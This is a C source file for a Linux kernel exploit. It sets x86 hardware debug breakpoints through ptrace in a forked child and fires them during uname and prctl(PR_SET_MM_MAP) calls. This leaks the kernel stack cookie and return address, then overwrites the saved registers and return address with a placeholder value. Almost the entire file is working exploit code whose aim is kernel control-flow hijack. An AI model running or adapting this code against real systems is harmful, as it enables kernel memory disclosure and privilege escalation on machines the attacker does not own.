#define _GNU_SOURCE
#include <sched.h>
#include <sys/mman.h>
#include <pthread.h>
#include <semaphore.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <sys/wait.h>
#include <stddef.h>
#include <asm/user_64.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <stdbool.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include "hbp_fire.h"

#define PAGE_SIZE 0x1000
pid_t hbp_pid;
char* map;
int hbp_ipc_pipefds[2];
void create_hbp(void* addr)
{
    //Set DR0: HBP address
    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg), addr) == -1) {
        printf("Could not create hbp! ptrace dr0: %m\n");
        teardown();
        exit(1);
    }
    /* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops on the instruction which causes the exception.
     * bits 16,17 means we stop on data read or write. Bits 18,19 say we watch 4 bytes. Why 4 bytes? Well, it's convenient to
     * hit 4 DB exceptions per syscall. Why not 8 bytes? Because 4 bytes works fine. */
    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg) + 56, 0xf0101) == -1) {
        printf("Could not create hbp! ptrace dr7: %m\n");
        teardown();
        exit(1);
    }
}
void hbp_raw_fire()
{
    //PTRACE_CONT'ing the process causes us to fall through the raised SIGSTOP in case 0 of our fork.
    if(ptrace(PTRACE_CONT,hbp_pid,NULL,NULL) == -1)
        {
            printf("Failed to PTRACE_CONT: %m\n");
            teardown();
            exit(1);
        }
}
void hbp_fire()
{
    int status;
    do {
        hbp_raw_fire();
        waitpid(hbp_pid,&status,__WALL);
    } while(WSTOPSIG(status) == SIGTRAP); //Will probably never hit unless we're testing userland hbp's, but it's good practice
}
void init(unsigned cpu)
{
    //I'm doing this in main() instead in order to make the pages visible to the uaf'ing task
    //map = mmap((void*) 0x0a000000,0x1000000,PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,0,0);
    printf("map at %p\n",map);
    switch(hbp_pid = fork())
    {
        case 0: //child
            //pin cpu
            cpu_set_t mask;
            CPU_ZERO(&mask);
            CPU_SET(cpu,&mask);
            sched_setaffinity(0,sizeof(mask),&mask);
            ptrace(PTRACE_TRACEME,0,NULL,NULL);
            const struct prctl_mm_map mm_map = {
                .start_code = 0x1000000,
                .end_code = 0x1100000,
                .start_data = 0x1000000,
                .end_data = 0x1100000,
                .start_brk = 0x2000000,
                .brk = 0x2000000,
                .start_stack = 0x1000000,
                .arg_start = 0x1000000,
                .arg_end = 0x1000000,
                .env_start = 0x1000000,
                .env_end = 0x1000000,
                .auxv = (void*) (map + 1),
                .auxv_size = 0x141,
                .exe_fd = -2

            };
            while(1) {
                //Halt, and wait to be told to hit watchpoint
                raise(SIGSTOP);
                //triggering hardware watchpoint
                //if map[0] is set, then we assume we're trying to do the write, not the read
                if(!map[0])
                    uname((void*) map);
                else 
                    prctl(PR_SET_MM,PR_SET_MM_MAP,&mm_map,sizeof(mm_map),0);
                //Loop back around again to raise another SIGSTOP. Actually we could have just spammed without ever stopping but stopping is a bit cleaner.
            }
        case -1:
            printf("fork: %m\n");
            exit(1);
        default: //parent. Just exit switch
            break;
    }
    int status;
    //Watch for stop:
    puts("Waiting for child");
    while(waitpid(hbp_pid,&status,__WALL) != hbp_pid || !WIFSTOPPED(status))
    {
        sched_yield();
    }
    puts("Setting breakpoint");
    create_hbp(map);
}
void teardown()
{
    kill(hbp_pid,9);
}
bool attempt_read()
{
    int status;
    memset(map,0,PAGE_SIZE);
    hbp_raw_fire();
    waitpid(hbp_pid,&status,__WALL);
    for(unsigned i = sizeof(struct utsname); i < PAGE_SIZE; i++)
        if(map[i])
            return true;
    return false;

}
int hbp_exploit()
{
    puts("Initializing");
    init(1);
    while(!attempt_read());
    struct __attribute__((__packed__)){
        char pad[sizeof(struct utsname)];
        unsigned long stack_cookie;
        unsigned long saved_rbx;
        unsigned long saved_rbp;
        unsigned long return_address;
    } * stack_data = (void*) map;
    printf("stack_cookie: %p\nsaved return address: %p\n",stack_data->stack_cookie,stack_data->return_address);
    unsigned long stack_cookie = stack_data->stack_cookie;
    struct __attribute__((__packed__)){
        char pad[0x171];
        unsigned long stack_cookie;
        unsigned long saved_rbx;
        unsigned long saved_rbp;
        unsigned long saved_r12;
        unsigned long saved_r13;
        unsigned long saved_r14;
        unsigned long saved_r15;
        unsigned long return_address;
    } * new_stack_data = (void*) map;

    memset(&new_stack_data->pad,0xff,sizeof(new_stack_data->pad));
    new_stack_data->stack_cookie = stack_data->stack_cookie;
    new_stack_data->return_address = 0xffffffff41414141;
    new_stack_data->saved_rbx = 0xbbbbbbbbbbbbbbbb;
    new_stack_data->saved_r12 = 0x1212121212121212;
    new_stack_data->saved_r13 = 0x1313131313131313;
    new_stack_data->saved_r14 = 0x1414141414141414;
    new_stack_data->saved_r15 = 0x1515151515151515;
    //sleep(1);
    puts("Attempting write:");
    fflush(stdout);
    while(1)
    {
        hbp_raw_fire();
        waitpid(hbp_pid,NULL,__WALL);

    }
    puts("Exiting");
    teardown();
}
#ifdef TEST_HBP
int main() {
    hbp_exploit();
}
#endif